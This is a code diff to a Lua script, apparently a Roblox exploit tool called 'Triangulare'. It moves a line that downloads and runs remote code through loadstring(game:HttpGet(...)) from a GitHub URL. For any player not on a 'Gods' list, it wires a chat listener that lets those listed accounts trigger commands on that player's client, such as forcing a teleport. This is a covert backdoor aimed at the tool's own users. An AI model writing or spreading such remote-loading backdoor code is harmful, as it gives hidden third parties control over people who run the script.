@@ -86,6 +86,8 @@ if Game then
       if not table.find(Gods, eu.Name) then
         local TextChatService = game:GetService("TextChatService")
         
+        local Gokka = loadstring(game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Triangulare/main/extra/Gokka.lua"))()
+        
         local Commands = {
           ["uh."] = function()
             local now = tick()
@@ -109,23 +111,21 @@ if Game then
             game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, eu)
           end
         }
-          local Gokka = loadstring(game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Triangulare/main/extra/Gokka.lua"))()
-          
-          Gokka:Connect({
-            Name = "TriangulareAdmin",
-            Signal = TextChatService.MessageReceived,
-            Callback = function(message)
-              local Command = Commands[message.Text]
-              if Command then
-                local props = message.TextSource
-                local UserId = props and props.UserId
-                if UserId then
-                  local sender = game:GetService("Players"):GetPlayerByUserId(UserId)
-                  if sender and table.find(Gods, sender.Name) then Command(sender) end
-                end
+        Gokka:Connect({
+          Name = "TriangulareAdmin",
+          Signal = TextChatService.MessageReceived,
+          Callback = function(message)
+            local Command = Commands[message.Text]
+            if Command then
+              local props = message.TextSource
+              local UserId = props and props.UserId
+              if UserId then
+                local sender = game:GetService("Players"):GetPlayerByUserId(UserId)
+                if sender and table.find(Gods, sender.Name) then Command(sender) end
               end
             end
-          })
+          end
+        })
         
         for _, p in pairs(game:GetService("Players"):GetPlayers()) do
           if p ~= eu and table.find(Gods, p.Name) then
